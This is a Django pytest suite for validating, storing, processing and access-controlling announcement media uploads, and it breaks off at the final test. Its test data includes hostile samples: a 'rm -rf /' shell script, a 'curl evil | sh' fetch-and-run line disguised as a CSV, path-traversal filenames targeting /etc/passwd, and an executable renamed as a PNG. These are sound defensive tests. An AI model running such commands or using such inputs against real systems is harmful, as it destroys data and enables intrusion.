"""Announcement media: validation, storage, processing, access, and retention.

The suite is organized around the ways an upload can go wrong, because that is
where the security of this feature lives: a disguised file, an image bomb, a
file that changes underneath its checksum, a file read by someone who has left
the audience, and storage nobody can account for.
"""

from __future__ import annotations

import io
from datetime import timedelta

import pytest
from django.core.exceptions import PermissionDenied, ValidationError
from django.core.files.uploadedfile import SimpleUploadedFile
from django.urls import reverse
from django.utils import timezone

from apps.announcements.media import (
    ALLOWED_MEDIA,
    HERO_EXTENSIONS,
    MAX_ATTACHMENTS,
    MAX_IMAGE_PIXELS,
    MIN_HERO_WIDTH,
    VARIANT_WIDTHS,
    checksum_of,
    detect_media_type,
    inspect_upload,
    safe_display_name,
    storage_key,
    variant_key,
)
from apps.announcements.media_service import (
    admin_media_payload,
    assert_readable,
    attach_media,
    attachments_payload,
    hero_payload,
    media_publish_debt,
    remove_media,
    reorder_attachments,
    replace_media,
    sweep_orphan_media,
)
from apps.announcements.models import Announcement, AnnouncementMedia
from apps.announcements.tasks import process_announcement_media
from apps.announcements.tests.test_audience import (
    announcement,
    company_admin,
    office,
    person,
)
from apps.audit.models import AuditEvent

Role = AnnouncementMedia.Role
State = AnnouncementMedia.ProcessingState


@pytest.fixture
def seeded(db):
    """Offices, roles, and categories. Defined here rather than imported, so
    ruff does not read a re-exported fixture as a shadowed definition."""
    from apps.user.office_seed import seed_offices
    from apps.user.roles import seed_brokerage_roles, seed_role_groups

    seed_role_groups()
    seed_brokerage_roles()
    seed_offices()


@pytest.fixture(autouse=True)
def isolated_media(settings, tmp_path):
    """Every test writes into its own directory, never the working tree."""
    settings.MEDIA_ROOT = str(tmp_path)
    return tmp_path


# --------------------------------------------------------------------------- #
# Fixtures for real bytes
# --------------------------------------------------------------------------- #


def png_bytes(width: int = 800, height: int = 600, *, exif: bool = False) -> bytes:
    from PIL import Image

    image = Image.new("RGB", (width, height), (30, 90, 160))
    buffer = io.BytesIO()
    image.save(buffer, format="PNG")
    return buffer.getvalue()


def jpeg_with_exif(width: int = 900, height: int = 700) -> bytes:
    from PIL import Image

    image = Image.new("RGB", (width, height), (200, 40, 40))
    exif = image.getexif()
    # 0x8825 is the GPS IFD pointer — the tag an announcement hero should never
    # carry out to the whole brokerage.
    exif[0x010F] = "SecretCameraCo"
    exif[0x0110] = "Model-XYZ"
    buffer = io.BytesIO()
    image.save(buffer, format="JPEG", exif=exif)
    return buffer.getvalue()


def upload(name: str, data: bytes, content_type: str = "application/octet-stream"):
    return SimpleUploadedFile(name, data, content_type=content_type)


def publisher():
    """The same administrator each time it is asked for within one test."""
    from apps.user.models import User

    existing = User.objects.filter(email="company.admin@example.com").first()
    return existing or company_admin()


def draft(slug: str = "draft-notice") -> Announcement:
    return announcement(
        slug, owner="fairfax-va", status=Announcement.Status.DRAFT, published_at=None
    )


def published(slug: str = "live-notice") -> Announcement:
    row = announcement(slug, owner="fairfax-va")
    from apps.announcements.models import AnnouncementAudience

    AnnouncementAudience.objects.create(
        announcement=row,
        kind=AnnouncementAudience.Kind.OFFICE,
        office=office("fairfax-va"),
    )
    return row


# --------------------------------------------------------------------------- #
# The allowed matrix
# --------------------------------------------------------------------------- #


def test_the_matrix_only_lists_types_the_sniffer_can_recognize():
    for extension, rule in ALLOWED_MEDIA.items():
        assert rule.accepted_types, extension
        assert rule.max_bytes > 0, extension


def test_only_images_may_be_the_hero():
    assert {".png", ".jpg", ".jpeg", ".webp"} == HERO_EXTENSIONS
    for extension in HERO_EXTENSIONS:
        assert ALLOWED_MEDIA[extension].is_image


@pytest.mark.parametrize(
    ("data", "expected"),
    [
        (b"\x89PNG\r\n\x1a\n rest", "image/png"),
        (b"\xff\xd8\xff\xe0 rest", "image/jpeg"),
        (b"%PDF-1.7 rest", "application/pdf"),
        (b"PK\x03\x04 rest", "application/zip"),
        (b"MZ\x90\x00", "application/x-dosexec"),
        (b"\x7fELF\x02\x01", "application/x-executable"),
        (b"#!/bin/sh\nrm -rf /", "text/x-script"),
        (b"plain words", "text/plain"),
        (b"\x00\x01\x02binary", "application/octet-stream"),
    ],
)
def test_detection_reads_the_bytes_not_the_name(data, expected):
    assert detect_media_type(data) == expected


# --------------------------------------------------------------------------- #
# Validation
# --------------------------------------------------------------------------- #


def test_an_allowed_image_passes_and_reports_what_the_server_measured():
    inspected, data = inspect_upload(upload("hero.png", png_bytes(1200, 800)))
    assert inspected.media_type == "image/png"
    assert (inspected.width, inspected.height) == (1200, 800)
    assert inspected.checksum == checksum_of(data)
    assert inspected.is_image


def test_a_disallowed_extension_is_refused():
    with pytest.raises(ValidationError) as excinfo:
        inspect_upload(upload("payload.exe", b"MZ\x90\x00"))
    assert "not allowed" in str(excinfo.value)


def test_an_executable_renamed_as_an_image_is_refused():
    """The disguise the extension check alone would miss."""
    with pytest.raises(ValidationError) as excinfo:
        inspect_upload(upload("holiday.png", b"MZ\x90\x00" + b"\x00" * 100))
    assert "application/x-dosexec" in str(excinfo.value)


def test_a_shell_script_renamed_as_a_csv_is_refused():
    with pytest.raises(ValidationError):
        inspect_upload(upload("data.csv", b"#!/bin/sh\ncurl evil | sh\n"))


def test_a_pdf_renamed_as_a_docx_is_refused():
    with pytest.raises(ValidationError):
        inspect_upload(upload("report.docx", b"%PDF-1.7\n" + b"x" * 200))


def test_an_oversized_file_is_refused():
    oversized = b"a" * (ALLOWED_MEDIA[".txt"].max_bytes + 1)
    with pytest.raises(ValidationError) as excinfo:
        inspect_upload(upload("big.txt", oversized))
    assert "MB or smaller" in str(excinfo.value)


def test_an_empty_file_is_refused():
    with pytest.raises(ValidationError):
        inspect_upload(upload("empty.txt", b""))


def test_an_image_bomb_is_refused_before_it_is_decoded():
    """A tiny file whose header claims an enormous canvas.

    Pillow writes this in well under a megabyte; decoding it would allocate
    gigabytes. The pixel-count ceiling is checked against the header, so the
    refusal costs nothing.
    """
    from PIL import Image

    side = 7000
    assert side * side > MAX_IMAGE_PIXELS
    buffer = io.BytesIO()
    Image.new("1", (side, side)).save(buffer, format="PNG")
    with pytest.raises(ValidationError) as excinfo:
        inspect_upload(upload("bomb.png", buffer.getvalue()))
    assert "pixels" in str(excinfo.value)


def test_an_over_wide_image_is_refused():
    with pytest.raises(ValidationError) as excinfo:
        inspect_upload(upload("wide.png", png_bytes(9000, 100)))
    assert "at most" in str(excinfo.value)


def test_a_document_cannot_be_the_hero():
    with pytest.raises(ValidationError) as excinfo:
        inspect_upload(upload("report.pdf", b"%PDF-1.7\n" + b"x" * 50), hero=True)
    assert "hero must be an image" in str(excinfo.value)


def test_a_hero_below_the_minimum_width_is_refused():
    narrow = png_bytes(MIN_HERO_WIDTH - 1, 400)
    with pytest.raises(ValidationError) as excinfo:
        inspect_upload(upload("small.png", narrow), hero=True)
    assert "at least" in str(excinfo.value)


def test_corrupt_image_bytes_are_refused():
    with pytest.raises(ValidationError):
        inspect_upload(upload("broken.png", b"\x89PNG\r\n\x1a\n" + b"garbage" * 20))


# --------------------------------------------------------------------------- #
# Storage keys
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "hostile",
    [
        "../../../etc/passwd.png",
        "/etc/passwd.png",
        "..\\..\\windows\\system32.png",
        "\x00hidden.png",
        ".hidden.png",
    ],
)
def test_a_submitted_filename_can_never_steer_the_path(hostile):
    key = storage_key(hostile)
    assert key.startswith("announcements/")
    assert ".." not in key
    assert key.count("/") == 1
    assert "passwd" not in key
    assert "system32" not in key


def test_keys_are_collision_resistant():
    keys = {storage_key("Q3.pdf") for _ in range(200)}
    assert len(keys) == 200


def test_an_unknown_extension_contributes_nothing_to_the_key():
    """Only an extension the matrix already accepted survives into the key."""
    key = storage_key("thing.exe")
    assert "." not in key.split("/")[-1]
    assert "exe" not in key
    assert storage_key("report.pdf").endswith(".pdf")


def test_display_name_keeps_the_name_and_drops_the_path():
    assert safe_display_name("../../secret/Q3 Report.pdf") == "Q3 Report.pdf"
    assert safe_display_name("") == "file"
    assert safe_display_name(".hidden") == "hidden"


def test_variant_keys_sit_beside_their_original():
    key = "announcements/abc123.png"
    assert variant_key(key, "thumb") == "announcements/abc123__thumb.png"


# --------------------------------------------------------------------------- #
# Attaching
# --------------------------------------------------------------------------- #


def test_attaching_stores_the_row_pending_and_never_readable_yet(seeded):
    actor = publisher()
    row = draft()
    media = attach_media(actor, row, upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40))

    assert media.processing_state == State.PENDING
    assert media.is_readable is False
    assert media.display_name == "memo.pdf"
    assert media.byte_size > 0
    assert media.uploaded_by == actor
    # Nothing a recipient could be shown.
    assert attachments_payload(row) == []


def test_the_stored_path_is_the_generated_key_not_the_upload_name(seeded):
    media = attach_media(
        publisher(),
        draft(),
        upload("../../Q3 Report.pdf", b"%PDF-1.7\n" + b"x" * 40),
    )
    assert media.file.name.startswith("announcements/")
    assert "Q3" not in media.file.name
    assert media.display_name == "Q3 Report.pdf"


def test_attaching_is_audited(seeded):
    attach_media(publisher(), draft(), upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40))
    assert AuditEvent.objects.filter(action="announcement.media_attached").exists()


def test_attaching_needs_management_authority(seeded):
    reader = person("reader@example.com", "fairfax-va")
    with pytest.raises(PermissionDenied):
        attach_media(reader, draft(), upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40))


def test_the_attachment_count_is_capped(seeded):
    actor = publisher()
    row = draft()
    for index in range(MAX_ATTACHMENTS):
        attach_media(actor, row, upload(f"memo{index}.txt", b"content"))
    with pytest.raises(ValidationError) as excinfo:
        attach_media(actor, row, upload("one-too-many.txt", b"content"))
    assert str(MAX_ATTACHMENTS) in str(excinfo.value)


def test_only_one_hero_stays_active(seeded):
    actor = publisher()
    row = draft()
    attach_media(actor, row, upload("first.png", png_bytes()), role=Role.HERO)
    attach_media(actor, row, upload("second.png", png_bytes()), role=Role.HERO)

    active = AnnouncementMedia.objects.filter(
        announcement=row, role=Role.HERO, is_active=True
    )
    assert active.count() == 1
    live = active.first()
    assert live is not None
    assert live.display_name == "second.png"


# --------------------------------------------------------------------------- #
# Processing
# --------------------------------------------------------------------------- #


def test_processing_makes_an_image_ready_and_generates_variants(seeded):
    media = attach_media(
        publisher(),
        draft(),
        upload("hero.png", png_bytes(1800, 1200)),
        role=Role.HERO,
    )
    assert process_announcement_media.run(media.pk) == State.READY

    media.refresh_from_db()
    assert media.processing_state == State.READY
    assert set(media.variants) == set(VARIANT_WIDTHS)
    for key in media.variants.values():
        assert media.file.storage.exists(key)


def test_variants_are_not_upscaled_beyond_the_source(seeded):
    media = attach_media(
        publisher(),
        draft(),
        upload("small.png", png_bytes(700, 500)),
        role=Role.HERO,
    )
    process_announcement_media.run(media.pk)
    media.refresh_from_db()
    # 700px wide: the thumb fits, the card and hero widths would be upscales.
    assert set(media.variants) == {"thumb"}


def test_processing_strips_image_metadata(seeded):
    from PIL import Image

    media = attach_media(
        publisher(),
        draft(),
        upload("photo.jpg", jpeg_with_exif()),
        role=Role.HERO,
    )
    process_announcement_media.run(media.pk)
    media.refresh_from_db()

    with media.file.storage.open(media.file.name, "rb") as handle:
        cleaned_bytes = handle.read()
    with Image.open(io.BytesIO(cleaned_bytes)) as cleaned:
        assert dict(cleaned.getexif()) == {}


def test_processing_leaves_documents_alone_but_marks_them_ready(seeded):
    media = attach_media(
        publisher(), draft(), upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40)
    )
    assert process_announcement_media.run(media.pk) == State.READY
    media.refresh_from_db()
    assert media.variants == {}


def test_bytes_that_changed_under_the_checksum_are_quarantined(seeded):
    """The stored file is not the file that was validated."""
    media = attach_media(
        publisher(), draft(), upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40)
    )
    storage = media.file.storage
    storage.delete(media.file.name)
    storage.save(media.file.name, io.BytesIO(b"%PDF-1.7\nsomething else entirely"))

    assert process_announcement_media.run(media.pk) == State.QUARANTINED
    media.refresh_from_db()
    assert media.is_readable is False
    assert "checksum" in media.processing_note.lower()


def test_a_missing_stored_file_fails_rather_than_crashing(seeded):
    media = attach_media(
        publisher(), draft(), upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40)
    )
    media.file.storage.delete(media.file.name)
    assert process_announcement_media.run(media.pk) == State.FAILED


def test_processing_a_row_that_never_committed_is_a_no_op(seeded):
    assert process_announcement_media.run(999_999) == "missing"


def test_processing_is_idempotent(seeded):
    media = attach_media(
        publisher(),
        draft(),
        upload("hero.png", png_bytes(1800, 1200)),
        role=Role.HERO,
    )
    process_announcement_media.run(media.pk)
    media.refresh_from_db()
    first = dict(media.variants)

    assert process_announcement_media.run(media.pk) == State.READY
    media.refresh_from_db()
    assert set(media.variants) == set(first)
    assert media.processing_state == State.READY


# --------------------------------------------------------------------------- #
# Publish gate
# --------------------------------------------------------------------------- #


def test_publishing_is_blocked_while_a_file_is_still_processing(seeded):
    row = draft()
    attach_media(publisher(), row, upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40))
    debt = dict(media_publish_debt(row))
    assert "media" in debt
    assert "still being processed" in str(debt["media"])


def test_publishing_is_blocked_by_a_quarantined_file(seeded):
    row = draft()
    media = attach_media(
        publisher(), row, upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40)
    )
    AnnouncementMedia.objects.filter(pk=media.pk).update(
        processing_state=State.QUARANTINED, processing_note="nope"
    )
    debt = dict(media_publish_debt(row))
    assert "failed checks" in str(debt["media"])
    assert "memo.pdf" in str(debt["media"])


def test_a_fully_processed_announcement_has_no_media_debt(seeded):
    row = draft()
    media = attach_media(
        publisher(), row, upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40)
    )
    process_announcement_media.run(media.pk)
    assert media_publish_debt(row) == []


def test_the_publish_service_refuses_while_media_is_unprocessed(seeded):
    from apps.announcements.models import AnnouncementAudience
    from apps.announcements.services import publish_announcement

    row = draft()
    AnnouncementAudience.objects.create(
        announcement=row,
        kind=AnnouncementAudience.Kind.OFFICE,
        office=office("fairfax-va"),
    )
    attach_media(publisher(), row, upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40))
    with pytest.raises(ValidationError) as excinfo:
        publish_announcement(publisher(), row)
    assert "media" in excinfo.value.message_dict


# --------------------------------------------------------------------------- #
# Reading
# --------------------------------------------------------------------------- #


def ready_attachment(row: Announcement, name: str = "memo.pdf") -> AnnouncementMedia:
    media = attach_media(publisher(), row, upload(name, b"%PDF-1.7\n" + b"x" * 40))
    process_announcement_media.run(media.pk)
    media.refresh_from_db()
    return media


def test_a_recipient_may_read_a_processed_file(seeded, client):
    row = published()
    media = ready_attachment(row)
    client.force_login(person("in@example.com", "fairfax-va"))
    assert client.get(reverse("announcement_media", args=[media.pk])).status_code == 200


def test_someone_outside_the_audience_may_not(seeded, client):
    row = published()
    media = ready_attachment(row)
    client.force_login(person("out@example.com", "charlottesville-va"))
    assert client.get(reverse("announcement_media", args=[media.pk])).status_code == 403


def test_a_quarantined_file_is_never_served_even_inside_the_audience(seeded, client):
    row = published()
    media = ready_attachment(row)
    AnnouncementMedia.objects.filter(pk=media.pk).update(
        processing_state=State.QUARANTINED
    )
    client.force_login(person("in@example.com", "fairfax-va"))
    assert client.get(reverse("announcement_media", args=[media.pk])).status_code == 403


def test_a_pending_file_is_never_served(seeded, client):
    row = published()
    media = attach_media(
        publisher(), row, upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40)
    )
    client.force_login(person("in@example.com", "fairfax-va"))
    assert client.get(reverse("announcement_media", args=[media.pk])).status_code == 403


def test_the_same_url_stops_working_when_the_reader_leaves_the_audience(seeded, client):
    """A previously working URL is not a durable grant."""
    row = published()
    media = ready_attachment(row)
    reader = person("mover@example.com", "fairfax-va")
    client.force_login(reader)
    url = reverse("announcement_media", args=[media.pk])
    assert client.get(url).status_code == 200

    reader.office = office("charlottesville-va")
    reader.save(update_fields=["office"])
    assert client.get(url).status_code == 403


def test_media_responses_are_not_cacheable(seeded, client):
    row = published()
    media = ready_attachment(row)
    client.force_login(person("in@example.com", "fairfax-va"))
    response = client.get(reverse("announcement_media", args=[media.pk]))
    assert "no-store" in response["Cache-Control"]
    assert "private" in response["Cache-Control"]


def test_a_variant_is_gated_exactly_like_its_original(seeded, client):
    row = published()
    media = attach_media(
        publisher(),
        row,
        upload("hero.png", png_bytes(1800, 1200)),
        role=Role.HERO,
    )
    process_announcement_media.run(media.pk)

    url = reverse("announcement_media_variant", args=[media.pk, "thumb"])
    client.force_login(person("out@example.com", "charlottesville-va"))
    assert client.get(url).status_code == 403
    client.force_login(person("in@example.com", "fairfax-va"))
    assert client.get(url).status_code == 200


def test_a_missing_variant_degrades_to_the_original(seeded, client):
    row = published()
    media = ready_attachment(row, "memo.pdf")
    client.force_login(person("in@example.com", "fairfax-va"))
    response = client.get(
        reverse("announcement_media_variant", args=[media.pk, "thumb"])
    )
    assert response.status_code == 200


def test_readable_payloads_hide_processing_state_from_recipients(seeded):
    row = published()
    media = ready_attachment(row)
    payload = attachments_payload(row)[0]
    assert payload["displayName"] == media.display_name
    assert "processingState" not in payload
    assert "checksum" not in payload


def test_admin_payloads_show_processing_state(seeded):
    row = draft()
    attach_media(publisher(), row, upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40))
    payload = admin_media_payload(row)["attachments"][0]
    assert payload["processingState"] == State.PENDING


def test_assert_readable_refuses_an_unprocessed_file(seeded):
    row = published()
    media = attach_media(
        publisher(), row, upload("memo.pdf", b"%PDF-1.7\n" + b"x" * 40)
    )
    with pytest.raises(PermissionDenied):
        assert_readable(person("in@example.com", "fairfax-va"), media)


# --------------------------------------------------------------------------- #
# Reorder, replace, remove
# --------------------------------------------------------------------------- #


def test_reordering_sets_the_requested_sequence(seeded):
    actor = publisher()
    row = draft()
    first = attach_media(actor, row, upload("a.txt", b"a"))
    second = attach_media(actor, row, upload("b.txt", b"b"))
    third = attach_media(actor, row, upload("c.txt", b"c"))

    reorder_attachments(actor, row, [third.pk, first.pk, second.pk])
    order = list(
        AnnouncementMedia.objects.filter(announcement=row, role=Role.ATTACHMENT)
        .order_by("sort_order")
        .values_list("display_name", flat=True)
    )
    assert order == ["c.txt", "a.txt", "b.txt"]


def test_reordering_ignores_an_id_from_another_announcement(seeded):
    actor = publisher()
    mine = draft("mine")
    theirs = draft("theirs")
    a = attach_media(actor, mine, upload("a.txt", b"a"))
    foreign = attach_media(actor, theirs, upload("f.txt", b"f"))

    reorder_attachments(actor, mine, [foreign.pk, a.pk])
    foreign.refresh_from_db()
    assert foreign.announcement.pk == theirs.pk
    a.refresh_from_db()
    assert a.sort_order == 0


def test_reordering_places_omitted_attachments_deterministically(seeded):
    actor = publisher()
    row = draft()
    first = attach_media(actor, row, upload("a.txt", b"a"))
    second = attach_media(actor, row, upload("b.txt", b"b"))

    reorder_attachments(actor, row, [second.pk])
    first.refresh_from_db()
    second.refresh_from_db()
    assert (second.sort_order, first.sort_order) == (0, 1)


def test_reordering_is_audited(seeded):
    actor = publisher()
    row = draft()
    media = attach_media(actor, row, upload("a.txt", b"a"))
    reorder_attachments(actor, row, [media.pk])
    assert AuditEvent.objects.filter(action="announcement.media_reordered").exists()


def test_replacing_keeps_the_position(seeded):
    actor = publisher()
    row = draft()
    attach_media(actor, row, upload("a.txt", b"a"))
    second = attach_media(actor, row, upload("b.txt", b"b"))

    replacement = replace_media(actor, second, upload("b2.txt", b"b2"))
    assert replacement.sort_order == 1
    assert replacement.display_name == "b2.txt"


def test_replacing_on_a_draft_removes_the_old_bytes(seeded):
    actor = publisher()
    row = draft()
    original = attach_media(actor, row, upload("a.txt", b"a"))
    storage = original.file.storage
    old_key = original.file.name

    replace_media(actor, original, upload("a2.txt", b"a2"))
    assert not storage.exists(old_key)
    assert not AnnouncementMedia.objects.filter(pk=original.pk).exists()


def test_removing_from_a_published_announcement_retains_the_record(seeded):
    actor = publisher()
    row = published()
    media = ready_attachment(row)
    storage = media.file.storage
    key = media.file.name

    remove_media(actor, media)
    media.refresh_from_db()
    assert media.is_active is False
    assert storage.exists(key), "published history must keep its bytes"
    assert attachments_payload(row) == []
    assert AuditEvent.objects.filter(action="announcement.media_retired").exists()


def test_removing_from_a_draft_deletes_the_bytes(seeded):
    actor = publisher()
    row = draft()
    media = attach_media(actor, row, upload("a.txt", b"a"))
    storage = media.file.storage
    key = media.file.name

    remove_media(actor, media)
    assert not storage.exists(key)
    assert not AnnouncementMedia.objects.filter(pk=media.pk).exists()
    assert AuditEvent.objects.filter(action="announcement.media_deleted").exists()


def test_deleting_removes_every_derivative_too(seeded):
    actor = publisher()
    row = draft()
    media = attach_media(
        actor, row, upload("hero.png", png_bytes(1800, 1200)), role=Role.HERO
    )
    process_announcement_media.run(media.pk)
    media.refresh_from_db()
    storage = media.file.storage
    keys = [media.file.name, *media.variants.values()]

    remove_media(actor, media)
    assert [key for key in keys if storage.exists(key)] == []


def test_archiving_an_announcement_keeps_its_media(seeded):
    row = published()
    media = ready_attachment(row)
    row.status = Announcement.Status.ARCHIVED
    row.save(update_fields=["status"])

    media.refresh_from_db()
    assert media.is_active is True
    assert media.file.storage.exists(media.file.name)


# --------------------------------------------------------------------------- #
# Orphan sweep
# --------------------------------------------------------------------------- #


def test_the_sweep_removes_storage_with_no_row(seeded):
    actor = publisher()
    row = draft()
    media = attach_media(actor, row, upload("a.txt", b"a"))
    storage = media.file.storage

    # Exactly what a rolled-back upload leaves: bytes on disk, no row.
    orphan = storage.save("announcements/orphaned.txt", io.BytesIO(b"nobody"))
    AnnouncementMedia.objects.filter(pk=media.pk).delete()

    report = sweep_orphan_media(now=timezone.now() + timedelta(hours=12))
    assert orphan in report.deleted_objects
    assert not storage.exists(orphan)


def test_the_sweep_leaves_a_freshly_written_object_alone(seeded):
    """An upload in flight in another request must not look like an orphan."""
    actor = publisher()
    row = draft()
    media = attach_media(actor, row, upload("a.txt", b"a"))
    orphan = media.file.storage.save("announcements/inflight.txt", io.BytesIO(b"new"))

    report = sweep_orphan_media()
    assert orphan not in report.deleted_objects
    assert media.file.storage.exists(orphan)


def test_the_sweep_never_touches_a_referenced_object(seeded):
    actor = publisher()
    row = draft()
    media = attach_media(
        actor, row, upload("hero.png", png_bytes(1800, 1200)), role=Role.HERO
    )
    process_announcement_media.run(media.pk)
    media.refresh_from_db()

    sweep_orphan_media(now=timezone.now() + timedelta(days=1))
    media.refresh_from_db()
    assert media.file.storage.exists(media.file.name)
    for key in media.variants.values():
        assert media.file.storage.exists(key)


def test_the_sweep_clears_media_on_an_abandoned_draft(seeded):
    actor = publisher()
    row = draft()
    media = attach_media(actor, row, upload("a.txt", b"a"))
    storage = media.file.storage
    key = media.file.name

    report = sweep_orphan_media(now=timezone.now() + timedelta(days=90))
    assert media.pk in report.deleted_rows
    assert not storage.exists(key)


def test_the_sweep_leaves_published_media_alone_however_old(seeded):
    row = published()
    media = ready_attachment(row)
    sweep_orphan_media(now=timezone.now() + timedelta(days=3650))
    media.refresh_from_db()
    assert media.file.storage.exists(media.file.name)


# --------------------------------------------------------------------------- #
# Hero payload
# --------------------------------------------------------------------------- #


def test_the_hero_payload_carries_its_variants(seeded):
    row = published()
    media = attach_media(
        publisher(), row, upload("hero.png", png_bytes(1800, 1200)), role=Role.HERO
    )
    process_announcement_media.run(media.pk)

    payload = hero_payload(row)
    assert payload is not None
    assert payload["isImage"] is True
    assert set(payload["variants"]) == set(VARIANT_WIDTHS)
    assert payload["url"].endswith(str(media.pk))


def test_there_is_no_hero_payload_before_processing_finishes(seeded):
    row = published()
    attach_media(
        publisher(), row, upload("hero.png", png_bytes(1800, 1200)), role=Role.HERO
    )
    assert hero_payload(row) is None


# --------------------------------------------------------------------------- #
# The management endpoints
# --------------------------------------------------------------------------- #


def png_upload(name="hero.png", width=1200, height=800):
    return upload(name, png_bytes(width, height), content_type="image/png")


def test_the_manager_page_renders_for_a_publisher(seeded, client):
    import json

    row = draft()
    client.force_login(publisher())
    response = client.get(
        reverse("announcement_media_manager", args=[row.pk]), HTTP_X_INERTIA="true"
    )
    assert response.status_code == 200
    body = json.loads(response.content)
    assert body["component"] == "AnnouncementMediaManager"
    assert body["props"]["limits"]["attachment"]["maxCount"] == MAX_ATTACHMENTS


def test_the_manager_page_is_refused_to_a_reader(seeded, client):
    row = draft()
    client.force_login(person("reader@example.com", "fairfax-va"))
    assert (
        client.get(
            reverse("announcement_media_manager", args=[row.pk]), HTTP_X_INERTIA="true"
        ).status_code
        == 403
    )


def test_uploading_through_the_endpoint_returns_the_new_row(seeded, client):
    row = draft()
    client.force_login(publisher())
    response = client.post(
        reverse("announcement_media_upload", args=[row.pk]),
        {"file": png_upload(), "role": "hero"},
    )
    assert response.status_code == 201
    payload = response.json()["media"]
    assert payload["displayName"] == "hero.png"
    assert payload["processingState"] == State.PENDING


def test_a_rejected_upload_returns_the_servers_own_sentence(seeded, client):
    row = draft()
    client.force_login(publisher())
    response = client.post(
        reverse("announcement_media_upload", args=[row.pk]),
        {"file": upload("holiday.png", b"MZ\x90\x00" + b"\x00" * 100)},
    )
    assert response.status_code == 422
    assert "application/x-dosexec" in response.json()["validation"]["fields"]["file"][0]


def test_uploading_with_no_file_is_a_validation_error_not_a_crash(seeded, client):
    row = draft()
    client.force_login(publisher())
    response = client.post(reverse("announcement_media_upload", args=[row.pk]), {})
    assert response.status_code == 422


def test_a_reader_cannot_upload(seeded, client):
    row = draft()
    client.force_login(person("reader@example.com", "fairfax-va"))
    response = client.post(
        reverse("announcement_media_upload", args=[row.pk]), {"file": png_upload()}
    )
    assert response.status_code == 403
    assert not AnnouncementMedia.objects.filter(announcement=row).exists()


def test_reordering_through_the_endpoint_persists(seeded, client):
    actor = publisher()
    row = draft()
    first = attach_media(actor, row, upload("a.txt", b"a"))
    second = attach_media(actor, row, upload("b.txt", b"b"))

    client.force_login(actor)
    client.post(
        reverse("announcement_media_reorder", args=[row.pk]),
        {"order": [str(second.pk), str(first.pk)]},
    )
    second.refresh_from_db()
    assert second.sort_order == 0


def test_reordering_ignores_a_non_numeric_id(seeded, client):
    actor = publisher()
    row = draft()
    media = attach_media(actor, row, upload("a.txt", b"a"))
    client.force_login(actor)
    response = client.post(
        reverse("announcement_media_reorder", args=[row.pk]),
        {"order": ["not-a-number", str(media.pk)]},
    )
    assert response.status_code in {302, 200}
    media.refresh_from_db()
    assert media.sort_order == 0


def test_removing_through_the_endpoint_works(seeded, client):
    actor = publisher()
    row = draft()
    media = attach_media(actor, row, upload("a.txt", b"a"))
    client.force_login(actor)
    client.post(reverse("announcement_media_remove", args=[media.pk]))
    assert not AnnouncementMedia.objects.filter(pk=media.pk).exists()


def test_a_publisher_cannot_manage_media_outside_their_scope(seeded, client):
    """The office guard, exercised through the endpoint."""
    from django.contrib.auth.models import Permission

    from apps.user.models import User, UserRoleAssignment

    outsider = person("branch.pub2@example.com", "fairfax-va")
    assignment = UserRoleAssignment(
        user=outsider,
        role="branch_admin",
        scope_type="office",
        scope_office=office("fairfax-va"),
    )
    assignment.refresh_status()
    assignment.full_clean()
    assignment.save()
    outsider.user_permissions.add(
        Permission.objects.get(
            content_type__app_label="web", codename="manage_announcements"
        )
    )
    outsider = User.objects.get(pk=outsider.pk)

    foreign = announcement(
        "pa-draft",
        owner="harrisburg",
        status=Announcement.Status.DRAFT,
        published_at=None,
    )
    client.force_login(outsider)
    response = client.post(
        reverse("announcement_media_upload", args=[foreign.pk]), {"file": png_upload()}
    )
    assert response.status_code == 403
    assert not AnnouncementMedia.objects.filter(announcement=foreign).exists()


def _scoped_publisher(email: str, office_slug: str):
    """A publisher whose authority stops at one branch."""
    from django.contrib.auth.models import Permission

    from apps.user.models import User, UserRoleAssignment

    actor = person(email, office_slug)
    assignment = UserRoleAssignment(
        user=actor,
        role="branch_admin",
        scope_type="office",
        scope_office=office(office_slug),
    )
    assignment.refresh_status()
    assignment.full_clean()
    assignment.save()
    actor.user_permissions.add(
        Permission.objects.get(
            content_type__app_label="web", codename="manage_announcements"
        )
    )
    return User.objects.get(pk=actor.pk)


def test_replacing_media_outside_the_actors_scope_is_refused(seeded, client):
    """Holding the permission is not authority over every announcement.

    ``manage_announcements`` is brokerage-wide, so the office boundary is the
    only thing standing between a branch admin and another branch's files.
    """
    foreign = announcement(
        "pa-draft",
        owner="harrisburg",
        status=Announcement.Status.DRAFT,
        published_at=None,
    )
    media = attach_media(publisher(), foreign, upload("theirs.txt", b"theirs"))

    client.force_login(_scoped_publisher("va.admin@example.com", "fairfax-va"))
    response = client.post(
        reverse("announcement_media_replace", args=[media.pk]),
        {"file": upload("mine.txt", b"mine")},
    )
    assert response.status_code == 403
    media.refresh_from_db()
    assert media.display_name == "theirs.txt"


def test_removing_media_outside_the_actors_scope_is_refused(seeded, client):
    foreign = announcement(
        "pa-draft-2",
        owner="harrisburg",
        status=Announcement.Status.DRAFT,
        published_at=None,
    )
    media = attach_media(publisher(), foreign, upload("theirs.txt", b"theirs"))

    client.force_login(_scoped_publisher("va.admin2@example.com", "fairfax-va"))
    response = client.post(reverse("announcement_media_remove", args=[media.pk]))
    assert response.status_code == 403
    assert AnnouncementMedia.objects.filter(pk=media.pk).exists()


def test_the_scope_guard_lives_in_the_service_not_only_the_view(seeded):
    """Called directly, bypassing the view, the refusal still holds."""
    foreign = announcement(
        "pa-draft-3",
        owner="harrisburg",
        status=Announcement.Status.DRAFT,
        published_at=None,
    )
    media = attach_media(publisher(), foreign, upload("theirs.txt", b"theirs"))
    outsider = _scoped_publisher("va.admin3@example.com", "fairfax-va")

    with pytest.raises(PermissionDenied):
        replace_media(outsider, media, upload("mine.txt", b"mine"))
    with pytest.raises(PermissionDenied):
        remove_media(outsider, media)


def test_a_field_error_is_not_republished_at_form_level(seeded, client):
    """The same sentence must not appear under both keys."""
    row = draft()
    client.force_login(publisher())
